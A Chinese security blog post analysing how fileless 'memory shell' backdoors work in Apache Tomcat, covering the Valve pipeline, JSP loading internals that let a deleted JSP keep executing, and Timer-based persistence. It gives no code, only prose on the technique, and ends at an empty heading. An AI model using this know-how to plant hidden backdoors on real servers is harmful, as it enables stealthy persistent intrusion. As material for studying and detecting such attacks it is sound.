前言

之前写的文章，最近太忙了一直没空研究新东西，发点老东西充充数，这篇文章是对上一篇tomcat内存马文章的补充，主要研究了valve和jsp类型的内存马。Timer和线程类型的内存马由于水平有限，没办法很稳定地拿到request，暂时没想到怎么稳定地投入到实战。另外websocket类型的内存马还没时间去细看，以后有时间学习了再补上。

tomcat valve内存马

原理

tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。其中Container共有4个层级，依次是Engine,Host,Context,Wrapper，这4个Container的实现类分别是StandardEngine,StandardHost,StandardContext,StandardWrapper。

Container处理的第一层就是Engine容器，但是在tomcat中Engine容器不会直接调用Host容器去处理请求。当请求到达Engine容器的时候，Engine并非是直接调用对应的Host去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做pipeline组件,跟pipeline相关的还有个也是容器内部的组件，叫做Valve组件。

Pipeline的作用就如其中文意思一样管道，可以把不同容器想象成一个独立的个体，那么pipeline就可以理解为不同容器之间的管道，道路，桥梁。那Valve这个组件是什么东西呢？Valve也可以直接按照字面意思去理解为阀门。pipeline是通道，valve是阀门。

在Catalina中，我们有4种容器，每个容器都有自己的Pipeline组件，每个Pipeline组件上至少会设定一个Valve(阀门)，这个Valve我们称之为BaseValve（基础阀）。基础阀的作用是连接当前容器的下一个容器(通常是自己的自容器),可以说基础阀是两个容器之间的桥梁。

Pipeline定义对应的接口Pipeline,标准实现了StandardPipeline。Valve定义对应的接口Valve,抽象实现类ValveBase,4个容器对应基础阀门分别是StandardEngineValve,StandardHostValve,StandardContextValve,StandardWrapperValve。在实际运行中Pipeline,Valve运行机制如下图。

在同一个Pipeline上可以有多个Valve,每个Valve都可以做一些操作，无论是Pipeline还是Valve操作的都是Request和Response。

原理这部分推荐再看看这篇文章，接着开始讲触发到Valve的地方。

CoyoteAdapter是Adapter的实现类，主要负责对请求进行封装，然后转发给Container。

在CoyoteAdapter#service方法中

执行了一段this.connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)

其中的this.connector.getService().getContainer()是StandardEngine，即执行StandardEngine的getPipeline()获取pipeline对象，然后执行getFirst()获取排第一位的Valve，然后执行其invoke方法，根据前面学习的知识，后续会依此执行不同容器层级的Valve。

所以我们自定义一个Valve，而Valve的实现类是ValveBase，则我们自定义一个Valve需实现ValveBase，然后重写其中的invoke()方法，就可以在我们自定义Valve中执行任意代码，且传入的是request和response，显然非常适合用来做内存马。

JSP型内存马

这个思路最早似乎是鲸落师傅公开的Tomcat容器攻防笔记之JSP金蝉脱壳，通过分析了tomcat下jsp加载流程，发现可以实现删除jsp文件依然能执行jsp的效果，也即是内存马的效果。

jsp加载流程

在Tomcat中，JSP被看作是一种特殊的servlet，当我们请求JSP时，Tomcat会对jsp进行编译，生成相应的class文件。

在Tomcat的配置文件/conf/web.xml中可以看到，tomcat默认有两个servlet，分别是DefaultServlet和JspServlet。

当一个请求进入，如果/WEB-INF/web.xml中定义的Servlet没有匹配到，就会走着两个默认的Servlet。其中DefaultServlet主要处理静态资源加载，而JspServlet主要处理.jsp和.jspx后缀的请求。

通过前面对Servlet的学习我们可以知道，对Servlet的调用是在ApplicationFilterChain#internalDoFilter的this.servlet.service(request, response)，所以我们直接看到JspServlet#service()，该方法功能是接收URL，判断是否预编译，关键方法在serviceJspFile。

其中的preCompile方法只有当请求参数以jsp_precompile开始才会做预编译，预编译会影响到我们后面要分析的一个关键方法JspServletWrapper#service

如果做了预编译会直接return，影响到我们jsp的正常使用，所以我们不需要预编译，且默认情况下也不会做预编译。

接着我们看看serviceJspFile方法，该方法功能是判断jsp是否已经注册成一个Servlet，没有则new一个JspServletWrapper并添加到JspRuntimeContext中，随后调用wrapper的service()方法。

这里的this.rctxt即是JspRuntimeContext，可以看到当创建一个JspServletWrapper后，会调用addWrapper添加到JspRuntimeContext中，所以所有注册的JspServletWrapper都会保存在JspRuntimeContext的jsps属性中。

下面看到关键方法JspServletWrapper.service，代码有点长，主要功能是将jsp生成java文件并编译成class，将class文件注册为servlet，调用servlet.service(request, response)

首先看看将jsp转成class的逻辑

前面两个if没有太大影响直接跳过，关键看到options.getDevelopment()这部分的if逻辑，options.getDevelopment()代表的是部署模式。

在开发模式下，容器会经常检查jsp文件的时间戳来决定是否进行编译，如果jsp文件的时间戳比对应的.class文件的时间戳晚就证明jsp又进行了修改，需要再次编译，但是不断地进行时间戳的比对开销很大，会影响系统性能，而在生产模式下系统不会经常想的检查时间戳。所以一般在开发过程中使用开发模式，这样可以在jsp修改后再次访问就可以见到修改后的效果非常方便，而系统上线之后就要改为生产模式，虽然生产模式下会导致jsp的修改需要重启服务器才可以生效，但是上线后的改动较少而且性能很重要

tomcat默认情况就是开发模式，所以可以执行到this.ctxt.compile()，看看compile的实现

首先通过this.jspCompiler.isOutDated()判断是否需要编译，如果需要则先removeGeneratedFiles删除已经生成的java和class文件，然后执行compile编译。

再补充个藏青师傅分享的小知识点，即不同的JSP是不同的jspServletWrapper处理。

下面有一个小知识点，theServlet是由volatile修饰的，在不同的线程之间可以共享，再通过synchronized (this)加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要this是一个值，那么theServlet属性的值是一样的，而this就是当前的jspServletWrapper，我们访问不同的JSP也是由不同的jspServletWrapper处理的。

最后回到jspServletWrapper#service()，触发servlet的service()方法。

通过上面的学习，不难梳理出：对于非第一次访问的JSP文件，我们请求其URL，由于已经在JspRuntimeContext的jsps属性中注册过jspServletWrapper，则会走到对应的jspServletWrapper。然后只要jspServletWrapper#service()能顺利执行到servlet的service()方法就可以正常访问JSP，那为了完成既定目标，前面jspServletWrapper#service()分析到的几个流程不能掉链子。

JspCompilationContext#compile方法会检查文件是否存在，并且会删除已生成的.java和.class文件，所以要尽力避免执行这个方法，师傅们公开的实现jsp内存马思路都是基于绕过这部分内容实现。

而后为了servlet.service()能顺利执行，则this.getServlet()得拿到正常servlet，则JspServletWrapper的theServlet属性一直要保存jsp文件生成的对应servlet，不过好在只要不调用JspServletWrapper#destroy，则theServlet属性就不会被清除。

Timer 型内存马

su18大师傅分享的思路，最早是园长师傅用来做后门的思路。园长师傅的jsp后门利用Timer对象创建一个定时任务，即使删除jsp文件后门代码逻辑依然有效，就效果而言确实是一种”内存马”。

参考官方对Timer计时器对象的解释

Corresponding to each Timer object is a single background thread that is used to execute all of the timer’s tasks, sequentially.

每个Timer对象都是一个单独的后台线程，用于按顺序执行所有计时器的任务。即使jsp文件被删除，但是线程还在执行任务。参考官方的描述

After the last live reference to a Timer object goes away and all outstanding tasks have completed execution, the timer’s task execution thread terminates gracefully (and becomes subject to garbage collection).

即要当Timer中的任务都完成执行且无任何引用，Timer的任务执行线程才会终止，才会触发java的垃圾回收机制(garbage collection)。

  • 有很多坑点目测是tomcat底层线程逻辑的一些问题，太菜了弄不明白

线程型内存马
